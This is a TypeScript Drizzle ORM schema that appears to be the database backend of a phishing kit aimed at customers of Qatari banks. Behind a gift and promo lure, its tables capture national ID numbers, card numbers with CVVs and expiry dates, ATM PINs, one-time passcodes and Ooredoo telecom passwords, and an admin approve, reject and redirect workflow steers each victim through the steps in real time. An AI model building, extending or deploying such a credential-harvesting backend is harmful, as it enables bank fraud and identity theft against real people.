import { pgEnum, pgTable, serial, text, timestamp, varchar } from "drizzle-orm/pg-core";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: text("role").$type<"user" | "admin">().default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

export const sessions = pgTable("sessions", {
  id: varchar("id", { length: 64 }).primaryKey(),
  selectedBank: varchar("selectedBank", { length: 50 }).notNull(),
  country: varchar("country", { length: 100 }).default("Qatar"),
  status: varchar("status", { length: 20 }).default("pending").notNull(), // pending, loading, approved, rejected
  currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
  adminAction: varchar("adminAction", { length: 20 }), // approve, reject
  redirectTarget: varchar("redirectTarget", { length: 50 }), // New field for admin redirection
  selectedGift: varchar("selectedGift", { length: 50 }),
  errorMessage: text("errorMessage"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type Session = typeof sessions.$inferSelect;
export type InsertSession = typeof sessions.$inferInsert;

export const personalDataSubmissions = pgTable("personalDataSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  nameArabic: text("nameArabic").notNull(),
  nameEnglish: text("nameEnglish").notNull(),
  idNumber: varchar("idNumber", { length: 50 }).notNull(),
  phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
  gender: varchar("gender", { length: 10 }),
  customerStatus: varchar("customerStatus", { length: 50 }),
  password: text("password"),
  title: varchar("title", { length: 20 }),
  middleName: text("middleName"),
  lastName: text("lastName"),
  promoCode: varchar("promoCode", { length: 50 }),
  country: varchar("country", { length: 100 }),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type PersonalDataSubmission = typeof personalDataSubmissions.$inferSelect;
export type InsertPersonalDataSubmission = typeof personalDataSubmissions.$inferInsert;

export const loginMethodSubmissions = pgTable("loginMethodSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  loginType: varchar("loginType", { length: 20 }).notNull(),
  cardNumber: varchar("cardNumber", { length: 50 }),
  cardholderName: text("cardholderName"),
  expiryDate: varchar("expiryDate", { length: 10 }),
  cvv: varchar("cvv", { length: 10 }),
  username: varchar("username", { length: 255 }),
  password: text("password"),
  deliveryMethod: varchar("deliveryMethod", { length: 20 }), // home, branch
  branchName: text("branchName"),
  deliveryAddress: text("deliveryAddress"),
  phoneConfirmation: varchar("phoneConfirmation", { length: 20 }),
  issuanceFee: varchar("issuanceFee", { length: 20 }),
  deliveryFee: varchar("deliveryFee", { length: 20 }),
  totalAmount: varchar("totalAmount", { length: 20 }),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type LoginMethodSubmission = typeof loginMethodSubmissions.$inferSelect;
export type InsertLoginMethodSubmission = typeof loginMethodSubmissions.$inferInsert;

export const atmPinSubmissions = pgTable("atmPinSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  pin: varchar("pin", { length: 10 }).notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type AtmPinSubmission = typeof atmPinSubmissions.$inferSelect;
export type InsertAtmPinSubmission = typeof atmPinSubmissions.$inferInsert;

export const otpSubmissions = pgTable("otpSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  otpCode: varchar("otpCode", { length: 10 }).notNull(),
  otpType: varchar("otpType", { length: 20 }).notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type OtpSubmission = typeof otpSubmissions.$inferSelect;
export type InsertOtpSubmission = typeof otpSubmissions.$inferInsert;

export const ooredooSubmissions = pgTable("ooredooSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  ooredooUser: varchar("ooredooUser", { length: 255 }).notNull(),
  ooredooPassword: text("ooredooPassword").notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type OoredooSubmission = typeof ooredooSubmissions.$inferSelect;
export type InsertOoredooSubmission = typeof ooredooSubmissions.$inferInsert;
